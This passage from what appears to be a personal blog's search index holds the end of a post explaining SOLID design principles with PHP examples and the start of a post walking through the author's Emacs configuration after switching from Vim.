every module work together as a system.   I’d like to point out that this sounds similar to our one thing rule for functions, except that it says functions should do one thing, and classes that follow SRP should have one responsibility, or one reason to change. Now first of all, we should not get confused, I’ve seen people claiming on the Internet that a class should do one thing and one thing only. That sounds like a horrible disaster, having all the classes doing only one particular thing is unimaginable.   Secondly, they do have many similarities. These two principles all try to extract out excessive code that does not belong to the code unit to achieve better maintainability, reduce coupling and improve cohesion. Now to save us from unnecessary semantic debates, let’s just agree on that one thing is literally one particular task to achieve, and one responsibility means a set of interdependent and interconnected jobs that can’t and shouldn’t be divided into smaller groups. A class that has a single responsibility indicates that there’s only one reason to change the class, no matter it’s fixing a bug or adding a new feature, we do it all under the scope of this particular responsibility.   However, these similarities give us a hint and we can practically use a similar set of steps to refactor a class to let it comply with SRP – We extract excessive functions and properties and put them in other classes until we couldn’t extract anything more out of it and give the extracted code a meaningful class name that is different from the original one.   Keep in mind this is kind of an extreme method, we do have to consider business logic and domain requirements in the process. Nevertheless, this should be a good way to get you started.   Another practical method comes from our last installment of Clean Code Tips and Tricks, where we discussed a way to detect if a class is not following SRP. We had a class called DataFileSplitterAndProcessor, it actually has two responsibilities, splitting and processing data files, thus there are two reasons to change the class – Maintaining the splitting functionalities, and maintaining the processing functionalities, which violates the SRP.   /*  * A simple trick to tell if a class follows  * SRP is to try to describe it as descriptive as you can.  */  class EmailService {     protected $invoice;      function __construct(InvoiceRepository $invoice) {         $this-&gt;invoice = $invoice;     }      private function calculateTax() {         return $this-&gt;invoice-&gt;subtotal * 0.025;     }      public function emailInvoiceToUser(UserRepository $user) {         /* Code to generate email message */         if (!$emailHasSentSuccessfully)             throw new EmailDeliveryFailedException();          return true;     } }   The above code shows a very poorly designed class, if you try your best to verbosely describe the class, it’s one that “Calculates the tax and generates invoice email and sends email to a user”. You may as well name the class as TaxAndInvoiceAndEmailService. In case you haven’t noticed, calculateTax() should belong to Invoice class, by calculating tax here in EmailService breaks encapsulation.   This is how this simple trick works, if you ever see a class that should be named with and in it’s name, then it’s most probably not following the SRP.   You may argue that your business logic is such that an email would only be generated and sent to the user in the case of sending invoices, it makes sense to congregate these methods into one class.   That maybe true to some extend, but having separate EmailService, InvoiceService and TaxService makes it much more clearer and easier to extend, what if a wild sending coupon expiring warning emails or a applying discounts to invoices exceeds certain amount in subtotal requirement appears in the future? What if such requirements keep comming and eventually make this class too complex and coupled to work with?   Open-Closed Principle      You should be able to extend a class’s behavior, without modifying it. ~ Robert C. Martin    A class should be open to extension, meaning a new behavior, functionality or property, but should be closed to modification, no extension should result in modifying of the existing code. Unless, of course, when you are fixing a bug.   class Product {     protected  $name;     protected  $price;      public funcion __construct($name, price) {         $this-&gt;name = $name;         $this-&gt;price = $price;     }      public function displayName() {         return $this-&gt;name;     }      public function displayPrice() {         return $this-&gt;price;     }      public function updatePrice($new_price) {         return $this-&gt;price = $new_price;     }      public function displayLabel() {         return $this-&gt;name . ': $' . $this-&gt;price;     } }   Imagain we have a Product class shown above, now our client wants a new feature, add a new type of product called promotional products each have their own discount rate, but their discounted prices are only available on 11th of November, the Chinese version of boxing day. Now, a conventional way to implement the new feature would be as shown below,   class Product {      protected $name;     protected $price;     protected $discount_rate; //&lt;-      public function __construct($name, $price, $discount_rate = NULL) {//&lt;-         $this-&gt;name = $name;         $this-&gt;price = $price;         $this-&gt;discount_rate = $discount_rate; //&lt;-     }      ...     ...      public function displayDiscountRate() { //&lt;-         return $this-&gt;discount_rate;     }      public function updateDiscountRate($new_discount_rate) { //&lt;-         return $this-&gt;discount_rate = $new_discount_rate; //&lt;-     } //&lt;-      public function displayLabel() { //&lt;-         if (!isset($this-&gt;discount_rate) || NOTTODAY()) {             return $this-&gt;name . ': $' . $this-&gt;price;         }          return $this-&gt;name .                ': Full Price $' .                $this-&gt;price .                ' Discounted Price $'.                $this-&gt;price * $this-&gt;discount_rate;     } }   To accomodate this new requirement, we had to add a property named $discount_rate, and we had to modify the class constructor and displayLabel function which is a bad idea that may lead to bugs and maintainability issues.   Note that we’ve talked about getting rid of class conditional switches in our Clean Code Tips and Tricks: Classes post, you can observe a similar conditional in the example code above as it checks if the instance has discount_rate set and then performs actions accordingly. Our suggestion then was to favor inheritance over conditionals in classes, Open-Closed Principle suggests the same thing.   BTW, utilizing NULL is in most cases a bad idea, it causes null pointer exceptions and may potentially lead to confusing bugs.   class Product {     /* Original Product Class */ }  class PromotionalProduct extends Product {      protected $discount_rate;      public function __construct($name, $price, $discount_rate = 1) {         $this-&gt;name = $name;         $this-&gt;price = $price;         $this-&gt;discount_rate = $discount_rate;     }      public function displayDiscountRate() {         return $this-&gt;discount_rate;     }      public function updateDiscountRate($new_discount_rate) {         return $this-&gt;discount_rate = $new_discount_rate;     }      public function displayLabel() {         if (NOTTODAY()) {             return $this-&gt;name . ': $' . $this-&gt;price;         }          return $this-&gt;name .                ': Full Price $' .                $this-&gt;price .                ' Discounted Price $'.                $this-&gt;price * $this-&gt;discount_rate;     } }   We did it without modifying the original Product class. By creating a new class called PromotionalProduct that extends Product, we inherited all member properties and methods, and by overwriting displayLabel() function’s behavior, we fullfiled the requirement, and we got rid of the conditional check since a promotional product should always have a discount rate even if it’s 1.   This looks better, but not yet bullet-proof, we’ll refine this code more later. Now this new additon may have bugs and issues, but we saved ourselves from creating problems in existing codebase by modifying it, which may potentially lead to much more confusing issues.   Another thing to note is that interfaces and inheritance are all viable ways to achieve abstraction and polymorphism, choosing which one to use is out of the scope of this post.   Plus the choice depends heavily on which programming language you use. For PHP, inheritance is a way to share similar behavior, traits can be used to share code among classes that need the same piece of code but share nothing else in common, and interfaces provide a way to define common protocols.   Liskov Substitution Principle   If Open-Closed Principle tells us how to avoid modifying existing code to improve maintainability by abstraction, the Liskov Substitution Principle tells us how to utilize abstraction correctly.      If for each object o1 of type S there is an object o2 of type T such that for all programs P defined in terms of T, the behavior of P is unchanged when o1 is substituted for o2 then S is a subtype of T. ~ Barbara Liskov    What we want to accomplish is that if a class A is a subtype of B, our program should remain unaffected if we replace object b of Class B with an object a of class A.   class Invoice {     ...     ...      public function calculateSubtotal($order) {         $subtotal = 0;         foreach ($order as $entry) {             $subtotal +=                 $entry-&gt;product-&gt;displayPrice() * $entry-&gt;getQuantity();         }          return $subtotal;     } }   Say we have an Invoice class in our system, in conjuction with Product and PromotionalProduct classes we wrote in our last example, we can calculate the subtotal of a given order like this.   However, as you may have realized, this method should work fine before we added PromotionalProduct, but the programmer who coded this didn’t foresee the comming requirement additon, thus it fails at calculating the correct subtotal when we supply $order with at least one instance of PromotionalProduct in it.   class Invoice {     ...     ...      public function calculateSubtotal($order) {         $subtotal = 0         foreach ($order as entry) {             if ($entry-&gt;product instanceof PromotionalProduct                 &amp;&amp;                 TODAY === BOXINGDAY) {                  $subtotal +=                     $entry-&gt;product-&gt;displayPrice() * $entry-&gt;product-&gt;displayDiscountRate() * $entry-&gt;getQuantity();             } else {                 $subtotal += $entry-&gt;product-&gt;displayPrice() * $entry-&gt;getQuantity();             }         }          return $subtotal;     } }   Looks like we did it, by differentiating which class the $product is an instance of, we perform calculations accordingly.   But still, this is a direct violation of Liskov Substitution Principle, we substituted objects of Product class with objects of class PromotionalProduct that extends Product, but our program was affected by this substitution, we had to change its behavior to avoid bugs.   LSP implies that our program should remain ignorant of such substitution, it shouldn’t care if the object is of the base class, or the derived class.   If you ever come across a piece of code like this, performing actions according to which class the object is an instance of, and the classes in the context implements abstraction (interface or inheritance), it’s a clear sign that you may have violated LSP. This piece of code most probably have the knowledge of every possible derivatives of the base class and need to be updated everytime we add a new type of variant.   Some may argue if we modify the displayPrice() getter in the derived class PromotionalProduct and let it return full prices and discounted prices accordingly, then we don’t have to know the object type in our Invoice class, we can calculate the subtotal simply by calling each object’s displayPrice() function.   That is true and viable, as long as we have the confidence that every derived class of the base class implements a displayPrice() properly, we don’t have to check the object type anymore. Doesn’t this sound familiar? Yes, Interface.   interface Product {     public function displayLabel();     public function displayPrice(); }  class NormalProduct implements Product {     private $name;     private $price;      ...      public function displayLabel() {         return $this-&gt;name . ': $' . $this-&gt;displayPrice();     }      public function displayPrice() {         return $this-&gt;price;     } }  class PromotionalProduct implements Product {     private $name;     private $price;     private $discount_rate;      ...      public function displayLabel() {         return $this-&gt;name . ': $' . $this-&gt;displayPrice();     }      public function displayPrice() {         if (TODAY != BOXINGDAY) {             return $this-&gt;price;         }          return $this-&gt;price * $this-&gt;discount_rate;     } }  class Invoice {     ...     ...      public function calculateSubTotal($order) {         $subtotal = 0;         foreach ($order as $entry) {             $subtotal += $entry-&gt;product-&gt;displayPrice() * $entry-&gt;getQuantity();         }          return $subtotal;     } }   By implementing a common interface, we defined common protocols that both NormalProduct and PromotionalProduct should comply, but they can implement the function according to their specialized business logics. Now that our Invoice class can confidently call displayPrice() on any object that complies with Product interface.   Of course, if Product and PromotionalProduct shares a lot in common, we could always use inheritance other than interface.   abstract class Product {     private $name;     private $price;      ...      abstract function displayPrice();      public function displayLabel() {         return $this-&gt;name . ': $' . $this-&gt;displayPrice();     } }  class NormalProduct extends Product {     ...      public function displayPrice() {         return $this-&gt;price;     } }  class PromotionalProduct extends Product {     ...      public function displayPrice() {         if (TODAY != BOXINGDAY) {             return $this-&gt;price;         }          return $this-&gt;price * $this-&gt;discount_rate;     } }   Let’s extend the example a bit to further visualize the topic. Let’s ignore the possibly flawed domain logic and just say that each product hold its own tax rate and shipping cost which would be used when generating an invoice. The catch here, is that products purchased with promotional price can’t be shipped outside of the country but normal products can, and to further encourage sales, all promotional products on 11th of November are tax-free.   abstract class Product {     private $name;     private $price;     private $weight;     private $size;     private $tax_rate;      ...     ...      public function calculateShippingCost($province) {         /*          * Code to calculate shipping costs          * according to provice, weight and size          */     }      public function updateTaxRate($new_tax_rate) {         $this-&gt;tax_rate = $new_tax_rate     }      public function getTaxRate() {         return $this-&gt;tax_rate;     } }  class NormalProduct extends Product {     ...     ...      /*      * Nothing to overwrite      * raleting to tax and shipping cost      */ }  class PromotionalProduct extends Product {     ...     ...      public function calculateShippingCost($province) {         // Promitonal products can't be shipped outside the country on boxing day.         if (!in_array($province, $domesticProvinces) &amp;&amp; TODAY === BOXINGDAY) {             throw new InvalidShippingProvinceException();         }          /* Calculate shipping cost normally */     }      public function getTaxRate() {         if (TODAY === BOXINGDAY) {             return 0;         }          return $this-&gt;tax_rate;     } }   We added a new property called $tax, a function to calculate shipping cost and to display tax rate in the base class, then we inherited the base class in NormalProduct class without any overwriting. In PromotionalProduct class however, we overwrote calculateShippingCost() and getTax() functions to reflect its specified requirements.   Now this looks perfect, what could ever go wrong? Let’s take a look at our Invoice class, which is a client (or user) of our base class Product.   class Invoice {      ...     ...      public function calculateTotalShippingCosts($order) {         $totalShippingCosts = 0;         foreach ($order as $entry) {             $totalShippingCosts += $entry-&gt;product-&gt;calculateShippingCost($order-&gt;address-&gt;province);         }          return $totalShippingCosts;     }      public function calculateTaxCredit($order) {         $totalTaxCredit = 0;         foreach ($order as $entry) {             switch ($entry-&gt;product-&gt;getTax()) {                 case 0.5:                     $totalTaxCredit += 1;                     break;                 case 1.5:                     $totalTaxCredit += 2;                     break;                 case 2.5:                     $totalTaxCredit += 3;                     break;                 default:                     throw new UnexpectedTaxValueExeception($entry-&gt;product);                     break;             }         }          return $totalTaxCredit;     }     ...     ... }   We have a calculateTotalShippingCosts() and a calculateTaxCredit() function here which grants users credit according to the tax rate of the product they purchased, this was intended as a virtual currency for tax-refund purposes.   Same as the last time, after we added the PromotionalProduct derived class, these two functions in Invoice class broke. When there is at least one instance of  PromotionalProduct in $order, calculateShippingCosts() would sometimes throw an exception when it’s boxing day and someone is purchasing promotional product from overseas, this exception was never expected when writing the Invoice class. While the calculateTaxCredit() function would simply throw an error on boxing day since we didn’t know any product could have a tax rate of zero.   This is an illustration of both precondition and postcondition violation.   public function calculateShippingCost($province) {     if (!in_array($province, $domesticProvinces) &amp;&amp; TODAY === BOXINGDAY) {         throw new InvalidShippingProvinceException();     }      / Calculate shipping cost normally */ }   Look at this function in our PromotionalProduct class, what we did wrong here is that we made the precondition of the original getShippingCost($province) function in abstract class Product stronger, the original function accepts any province or states in the world and yields shipping cost accordingly, but in PromotionalProduct it only accepts domestic provinces on boxing day, thus we strengthened the precondition, causing function callings in clients or users of the base class to potentially fail since they passed the now considered weaker parameter to our overwritten function.   public function getTaxRate() {     if (TODAY === BOXINGDAY) {         return 0;     }      return $this-&gt;tax_rate; }   The getTax() function in our PromotionalProduct class on the other hand, by adding one more possible return value, zero in this case, we made the postcondition weaker. This caused clients or users of the Product class getting unexpected return values from instances of PromotionalProduct.   These all contributed to the unsuccessful substitution, the client of the base class cannot simply work with the newly extended derivative properly.      …when redefining a routine [in a derivative], you may only replace its precondition by a weaker one, and its postcondition by a stronger one. ~ Bertrand Meyer    To fix this problem, we have to strengthen the precondition in the base class thus the extending class won’t have a stronger one, and weaken the postcondition so that the extending class won’t have a weaker one.   abstract class Product {     ...     ...      public function canShipOverseas(){         return true;     }      public function calculateShippingCost($province) {         if (!$this-&gt;canShipOverSeas()) {             thow new InvalidShippingProvinceException();         }          /* As usual */     } }  class NormalProduct extends Product {     ...     ...      /* Nothing as well */ }  class PromotionalProduct extends Product {     ...     ...      public function canShipOverseas() {         if (!in_array($province, $domesticProvinces) &amp;&amp; TODAY === BOXINGDAY) {             return false;         }     }      /* Don't have to overwrite calculateShippingcost() this time */ }  class Invoice {     ...     ...      public function calculateTaxCredit($order) {         $totalTaxCredit = 0;         foreach ($order as $entry) {             switch ($entry-&gt;product-&gt;getTax()) {                 case 0:                     $totalTaxCredit += 0;                 case 0.5:                     $totalTaxCredit += 1;                     break;                 case 1.5:                     $totalTaxCredit += 2;                     break;                 case 2.5:                     $totalTaxCredit += 3;                     break;                 default:                     throw new UnexpectedTaxValueExeception($entry-&gt;product);                     break;             }         }          return $totalTaxCredit;     } }   As shown in the example code above, we added a canShipOverseas() function and checks if it’s true in the calculateShippingCost() function. Placing them all in the base abstract class enforces the precondition so that it is possible to raise exception on boxing day when some customer places an order from  overseas.   To fix the problem in getTaxRate() function is fairly easy, we just need to acknowledge that the postcondition is that it may return zero, and just reflect that in the calculateTaxCredit() function. Note that inheritance alone cannot be a violation to LSP, there has to be at least one client program in the context which would broke if an object of the base class was replaced by an object of the subclass. If all client programs are able to perform the substitution with unchanged behavior, then the code is compliant with LSP.   Another thing to keep in mind if you are confronted with a base class and it’s derived class that violates LSP and you feel there’s no elegant way to make them compliant, there’s a good chance that the subclass should not inherit the base class, they should be two different classes. This scenario is covered in the famous Rectangle-Square problem, refer to it if you are interested to know more.   Interface Segregation Principle   To put it simply, we split interfaces into smaller ones so that their implementing classes wouldn’t be forced to implement methods they don’t want.   interface Faculty {     public function teachClass($class);      public function conductTutorial($tutorial);      public function markAssignment($assignment); }   Say we have a Faculty interface as shown above, now a lecture should teach classes and mark assignments, but what if our business logic dictates that only teaching assistant can conduct tutorials? By having our Lecture class implementing this interface, we force it to conduct tutorials.   interface Teacher {     public function teachClass($class); }  interface Tutor {     public function conductTutorial($tutorial); }  interface Marker {     public function markAssignment($assignment); }  class Lecture implements Teacher, Marker {     public function teachClass($class) {     }      public function markAssignment($assignment) {     } }  class TeachingAssistant implements Tutor, Marker {     public function conductTutorial($tutorial) {     }      public function markAssignment($assignment) {     } }   Now this looks much more reasonable, having derived classes only implement methods they are interested in decouples them with undesired responsibilities.   Dependency Inversion Principle   Let’s begin with an example.   class Email {     public function send() {         /* code to send email */     } }  class PromotionNotification {     protected $email;      function __construct(Email $email) {         $this-&gt;email = $email;     }      public function send() {         $this-&gt;email-&gt;send();     } }   We say that PromotionNotification class is tightly coupled with Email class since it directly depends on it and knows it’s business logic. The problem with coupling is if we decide to add another way to send promotional messages, through SMS for example, we’d have to go back to our PromotionNotification class to change it’s implementation, thus violating Open-Closed Principle.   Dependency Inversion Principle helps us to decouple our codebase. Note that DIP and Dependency Injection are essentially two things, but you can view DI as a means to achieve DIP. We’ll talk about this later.      Depend on abstractions, not on concretions. … High level modules should not depend upon low level modules. Both should depend upon abstractions. … ~ Robert C. Martin    So instead of letting PromotionNotification class depend on concrete Email class, let’s have it depend on an abstraction of it.   interface MessageService {     public function send(); }  class Email implements MessageService {     public function send() {         /* Code to send email message */     } }  class SMS implements MessageService {     public function send() {         /* Code to send SMS message */     } }  class PromotionNotification {     protected $messageService;      function __construct(MessageService $messageService) {         $this-&gt;messageService = $messageService;     }      public function send() {         $this-&gt;messageService-&gt;send();     } }   Here we added an abstraction interface called MessageService and let both our Email and SMS class to implement it. Now our PromotionNotification depends on MessageService and by protocol defined, we know any derived class should have a send() function implemented.   We are now complaint with DIP since we now don’t depend on any concrete class, and we are free to switch MessageService with any of it’s implementing class without having to modify existing code, or affect our system’s behavior.   ...  $promotionNotification = new PromotionNotification(new Email());  ...  $promotionNotification-&gt;send();   This dependency injection technique is called the Contructor Injection, we inject dependency when creating an object of PromotionNotification class. If we’d like to specify the dependency as we call send() function, we can switch to Method Injection.   class PromotionNotification {     public function sendVia(MessageService $messageService) {         $messageService-&gt;send();     } }   Note that MessageService has been moved out of the constructor and in the sendVia() function’s signature. Now we can switch implementing classes on the fly.   $promotionNotification = new PromotionNotification();  ...  $promotionNotification-&gt;sendVia(new Email());  $promotionNotification-&gt;sendVia(new SMS());   Choose either method according to your requirements.   You did it! This is the end of our discussion on S.O.L.I.D principle, a powerful and well recognized design principle that I think should be adopted by every project. We talked about each of the five principles, discussed some examples , common misconceptions, and stressed some topics which I think are not getting enough attention from sources I’ve read online. I hope you enjoyed it, and looking forward to seeing you in the next installment on Software Design Principles.  ","categories": [],
        "tags": ["Design Principles","PHP","SOLID"],
        "url": "http://localhost:4000/software-design-principles-that-looks-solid/",
        "teaser":null},{
        "title": "How I Switched From Vim to Emacs",
        "excerpt":"I’ve been using vim as my preferred choice of editor for a little more than five years by the time I decided to leave for emacs for good. During these five years, I’ve tried other text editors and IDEs, sometimes in search of a better editing tool, sometimes to fit the development evironment of the projects I worked on, but vim was trumphant as I kept installing vim emulators even when I was using other editors, and I always went back to it eventually.   One may have many different kinds of reasons for switching to another text editor, and many feel obliged to justify their reasonings as editors mean more than just tools to program in, they’ve become faith, even religions.   Jokingly or seriously, switching from vim to emacs can already be considered sacriligous, let alone the fact that I actually use evil-mode to emulate vim key mappings to ease the learning curve. Though I have personnally gone through lots of thinkings and justifications to make the final decision, I figure it would mean little to those who doesn’t care about editor wars, and even less to editor apologists, my reasonings may just offend them more.   So to completely avoid the fruitless effort of blogging my justifications, and as the title of this post intended, this is about how I made the switch, not why I did it. If you are new to emacs, and have used vim before, my config and comments below can be a good boilerplate to get you started.   Summary   This setup was tailored specifically to meet my requirements and use cases, I’ll however be more than happy if you find it useful out-of-the-box, though I deem this better as a starter config to get things going and to showcase what emacs and some popular plugins can do.   This config is heavily inspired (and copied from) Harry R. Schwartz’s, it’s his talk that got me switching to emacs in the first place.   General Structure   Save init.el as ~/.emacs.d/init.el, it installs use-package and configures it with some popular repos.   Save conf.org as ~/.emacs.d/conf.org, init.el would compile this org document into conf.el and then load it with org-babel-load-file.   This allows literature programming, which helps keeping this configuration readable and maintainable.   Package Configuration   Make sure use-package auto compiles and always uses the newest version.   This is the package or plugin control system if you will for emacs.       (setq use-package-always-ensure t)     (setq load-prefer-newer t)     (use-package auto-compile       :config (auto-compile-on-load-mode))   Default Configuration   Use sensible-defaults.el for some recommended default setups.   Unfortunately this can’t be installed as a package. Though the repo hasn’t been updated for two years, makes sense to just copy-paste it into emacs.d folder.   You need to manually checkout the file into your emacs config folder for this to work properly.       (load-file \"~/.emacs.d/sensible-defaults.el\")     (sensible-defaults/use-all-settings)     (sensible-defaults/use-all-keybindings)     (sensible-defaults/backup-to-temp-directory)   Bind the M-o key to switch between windows. This does not work on my Macbook though, need to find out why. The good old C-x o works perfectly still.       (global-set-key (kbd \"M-o\") 'other-window)   Evil Mode   evil-mode enables vim keymappings for emacs, it makes my life much easier.       (use-package evil       :config       (evil-mode 1))   Enable org-mode agenda keymaps with evil-org-mode. Now you can use vim key bindings in org-mode.       (use-package evil-org       :diminish evil-org-mode       :after org       :config       (add-hook 'org-mode-hook 'evil-org-mode)       (add-hook 'evil-org-mode-hook                 (lambda () (evil-org-set-key-theme)))       (require 'evil-org-agenda)       (evil-org-agenda-set-keys))   Here comes evil-surround, a ported version of surround.vim, good stuff.       (use-package evil-surround       :ensure t       :config       (global-evil-surround-mode 1))   Powerline for emacs, to make you feel right at home.       (use-package powerline-evil       :ensure t       :config       (powerline-evil-center-color-theme))   UI Preferences   Tweak window chrome   Disables tool-bar and menu-bar, they take spaces but I rarely use them.       (tool-bar-mode 0)     (menu-bar-mode 0)   There’s a tiny scroll bar that appears in the minibuffer window. This disables that:       (set-window-scroll-bars (minibuffer-window) nil nil)   The default frame title isn’t useful. This binds it to the name of the current projectile project:       (setq frame-title-format '((:eval (projectile-project-name))))   Use Fancy Lambdas   Yea, why not.       (global-prettify-symbols-mode t)   Theme   I like wilson theme from sublime themes.       (use-package sublime-themes)      (load-theme 'wilson t)   Scroll conservatively   This prevents the screen from jumping when your cursor moves out of the window.   I actually find the default center at the cursor location fun and useful. Uncomment this line and try if it works for you.       ;; (setq scroll-conservatively 100)   Highlight the current line   global-hl-line-mode softly highlights the background color of the line containing point. It makes it a bit easier to find point, and it’s useful when pairing or presenting code.       (global-hl-line-mode)   Diminish unnecessary modes   Use diminish to hide or abbreviates minor modes from the mode line. They continue to work, though.       (use-package diminish)   Project management   dired   Use dired-hide-dotfiles to hide dot files and toggle visibility with ..       (use-package dired-hide-dotfiles)      (defun my-dired-mode-hook ()       \"My `dired' mode hook.\"       ;; To hide dot-files by default       (dired-hide-dotfiles-mode)         ;; To toggle hiding        (define-key dired-mode-map \".\" #'dired-hide-dotfiles-mode))      (add-hook 'dired-mode-hook #'my-dired-mode-hook)   These are the switches that get passed to ls when dired gets a list of files. We’re using:      l: Use the long listing format.   h: Use human-readable sizes.   v: Sort numbers naturally.   a: Include all files.   Change this if you want your folder listing in a different flavor.       (setq-default dired-listing-switches \"-lhva\")   Kill buffers of files/directories that are deleted in dired.       (setq dired-clean-up-buffers-too t)   Always copy directories recursively instead of asking every time.       (setq dired-recursive-copies 'always)   Ask before recursively deleting a directory, though.       (setq dired-recursive-deletes 'top)   Open a file with an external program (I use a Mac, so it’s open) by hitting C-c C-o.       (defun dired-xdg-open ()       \"In dired, open the file named on this line.\"       (interactive)       (let* ((file (dired-get-filename nil t)))         (call-process \"open\" nil 0 nil file)))      (define-key dired-mode-map (kbd \"C-c C-o\") 'dired-xdg-open)   ag   Set up ag for displaying search results. You need to install ag binary for this to work properly.   Run brew install ag manually if you are a Mac user.   Hit M-x, then type ag or ag-project and press enter to search recursively.       (use-package ag)   company   Use company-mode everywhere.       (use-package company       :diminish company-mode)     (add-hook 'after-init-hook 'global-company-mode)   I use ac-php for auto completion. Still useful to bind a company-mode completion key.   You can hit M-/ for auto completion no matter what language you use.       (global-set-key (kbd \"M-/\") 'company-complete-common)   dumb-jump   dumb-jump is the “jump to definition” package for emacs.   I bind M-v and M-w to ‘go’ and ‘back’ respectively since I use Dvorak keyboard.   They are equivalent to M-&gt; and M-&lt; if you use QWERT keyboard, so change the following keybindings if you do.       (use-package dumb-jump       :config       (define-key evil-normal-state-map (kbd \"M-v\") 'dumb-jump-go)       (define-key evil-normal-state-map (kbd \"M-w\") 'dumb-jump-back)       (setq dumb-jump-selector 'ivy))   flycheck   flycheck is a on the fly syntax checking extension. It supports many programming languages out of the box.       (use-package flycheck       :ensure t       :init (global-flycheck-mode))   magit   magit is a fantastic version control extension for emacs.   There are some tweaks here:      Bind magit status menu to C-x g.                     After that, bring up help menu with h and select actions you want to perform.                        It’ll tell you the key binding combination for that action, you can memerize it for next time.                        Use evil-magit for evil key bindings.            Per tpope’s suggestions, highlight commit text in the summary line that goes beyond 50 characters.       I’d like to start in the insert state when writing a commit message.       (use-package magit       :bind       (\"C-x g\" . magit-status)        :config       (use-package evil-magit)       (use-package with-editor)       (setq git-commit-summary-max-length 50)        (add-hook 'with-editor-mode-hook 'evil-insert-state))   Projectile   projectile is a project interaction library for emacs which enables functionalities like switching between projects, search for file in a project, replace in project and so on.   The following enables projectile globally, customizes some key chords and sets the default directory to look for projects. You can find a more detailed customization guide in its documentation.       (use-package projectile       :bind       (\"C-c v\" . 'projectile-ag)        :config       (define-key projectile-mode-map (kbd \"C-c p\") 'projectile-command-map)       (define-key evil-normal-state-map (kbd \"C-p\") 'projectile-find-file)       (evil-define-key 'motion ag-mode-map (kbd \"C-p\") 'projectile-find-file)       (evil-define-key 'motion rspec-mode-map (kbd \"C-p\") 'projectile-find-file)        (setq projectile-completion-system 'ivy)       (setq projectile-switch-project-action 'projectile-dired)       (setq projectile-require-project-root nil))       (setq projectile-project-search-path '(\"~/Projects/\"))      (projectile-global-mode)   Programming Language Specifics   General Programming   Some adjustments and tweaks for general text editing.   Tabs   Change tab width to 2.       (setq-default tab-width 2)   superword   I’d like to treat camelCasedWord as a whole and don’t often have to navigate inside them. If treating camelCasedWord as three different words is what you want, uncomment the following code.       ;; (use-package subword-mode     ;;  :diminish subword-mode     ;;  :config (global-subword-mode 1))   I enabled superword-mode as a hook for /php-mode/(see PHP section) since that’s what I desire mostly when working on PHP projects.   Ya-snippet   yasnippet is a templating system for emacs. I’m not very crazy about snippets, but it’s good to know it’s available.       (use-package yasnippet       :diminish yasnippet-mode       :config       (yas-global-mode 1))   I keep my non-existent snippets in ~/.emacs/snippets/text-mode       (setq yas-snippet-dirs '(\"~/.emacs.d/snippets/text-mode\"))   I don’t want yas to automatically indent the snippets it inserts. Sometimes this looks pretty bad (when indenting org-mode, for example, or trying to guess at the correct indentation for Python).       (setq yas/indent-line nil)   Spell-checking   Endable flyspell when editing text, markdown, org-mode and git commit message.   Hit Ctrl-xs to auto correct previous word from cursor.       (use-package flyspell       :diminish flyspell-mode        :config       (add-hook 'text-mode-hook 'turn-on-auto-fill)       (add-hook 'gfm-mode-hook 'flyspell-mode)       (add-hook 'org-mode-hook 'flyspell-mode)        (add-hook 'git-commit-mode-hook 'flyspell-mode))      (global-set-key (kbd \"\\C-xs\") 'flyspell-auto-correct-previous-word)   Wrap paragraphs automatically   Automatically trigger autofillmode when edition text, markdown or in org-mode. Same as hitting M-q       (add-hook 'text-mode-hook 'auto-fill-mode)     (add-hook 'gfm-mode-hook 'auto-fill-mode)     (add-hook 'org-mode-hook 'auto-fill-mode)     (diminish 'auto-fill-function)   Set up helpful   helpful is an alternative emacs help extension that provides much more contextual information.       (use-package helpful)      (global-set-key (kbd \"C-h f\") #'helpful-callable)     (global-set-key (kbd \"C-h v\") #'helpful-variable)     (global-set-key (kbd \"C-h k\") #'helpful-key)     (evil-define-key 'normal helpful-mode-map (kbd \"q\") 'quit-window)      ;; Lookup the current symbol at point. C-c C-d is a common keybinding     ;; for this in lisp modes.     (global-set-key (kbd \"C-c C-d\") #'helpful-at-point)      ;; Look up *F*unctions (excludes macros).     ;;     ;; By default, C-h F is bound to `Info-goto-emacs-command-node'. Helpful     ;; already links to the manual, if a function is referenced there.     (global-set-key (kbd \"C-h F\") #'helpful-function)      ;; Look up *C*ommands.     ;;     ;; By default, C-h C is bound to describe `describe-coding-system'. I     ;; don't find this very useful, but it's frequently useful to only     ;; look at interactive functions.     (global-set-key (kbd \"C-h C\") #'helpful-command)   Save my location within a file   Using save-place-mode saves the location of point for every file I visit. If I close the file or close the editor, then later re-open it, point will be at the last place I visited.       (save-place-mode t)   Always indent with spaces   Never use tabs. Tabs are the devil’s whitespace.       (setq-default indent-tabs-mode nil)   Install and configure which-key   which-key displays the possible completions for a long keybinding. Which is really helpful for some modes (like projectile, for example).   Handy when you forget a keybinding, try hitting something like Ctrl-x and wait for the magic to happen.       (use-package which-key       :diminish       :config       (which-key-mode))   Configure Swiper   swiper repo contains ivy for completion, counsel for a collection of emacs commands and swiper as an alternative to isearch.   This configuration:      Uses counsel-M-x for command completion,   Replaces isearch with swiper,   Uses smex to maintain M-x history,   Enables fuzzy matching everywhere except swiper (where it’s thoroughly unhelpful), and   Includes recent files in the switch buffer.       (use-package counsel       :diminish ivy-mode       :bind       (\"M-x\" . 'counsel-M-x)       (\"C-s\" . 'swiper)        :config       (use-package flx)       (use-package smex)        (ivy-mode 1)       (setq ivy-use-virtual-buffers t)       (setq ivy-count-format \"(%d/%d) \")       (setq ivy-initial-inputs-alist nil)       (setq ivy-re-builders-alist         '((swiper . ivy--regex-plus)           (t . ivy--regex-fuzzy))))   Switch and rebalance windows when splitting   When splitting a window, I invariably want to switch to the new window. This makes that automatic.       (defun hrs/split-window-below-and-switch ()       \"Split the window horizontally, then switch to the new pane.\"       (interactive)       (split-window-below)       (balance-windows)       (other-window 1))      (defun hrs/split-window-right-and-switch ()       \"Split the window vertically, then switch to the new pane.\"       (interactive)       (split-window-right)       (balance-windows)       (other-window 1))      (global-set-key (kbd \"C-x 2\") 'hrs/split-window-below-and-switch)     (global-set-key (kbd \"C-x 3\") 'hrs/split-window-right-and-switch)   Markdown   Use markdown-mode to handle .md files and pandoc for generating result.      Associate .md files with GitHub-flavored Markdown.   Use pandoc to render the results.   Leave the code block font unchanged.       (use-package markdown-mode       :commands gfm-mode        :mode ((\"\\\\.md$\" . gfm-mode))        :config       (setq markdown-command \"pandoc --standalone --mathjax --from=markdown\")       (custom-set-faces        '(markdown-code-face ((t nil)))))   PHP   There are other PHP extensions such as phpunit and composer, but I feel they don’t contribute too much to my emacs experience and I still prefer to run these manually.   ac-php and php-mode   php-mode for PHP support and ac-php for auto completion.   Things to note:      Enabled superword-mode when editing PHP files.   Common lisp library cl as suggested by ac-php’s documentation was replaced by cl-lib as the latter is newer and recommended.   You can choose 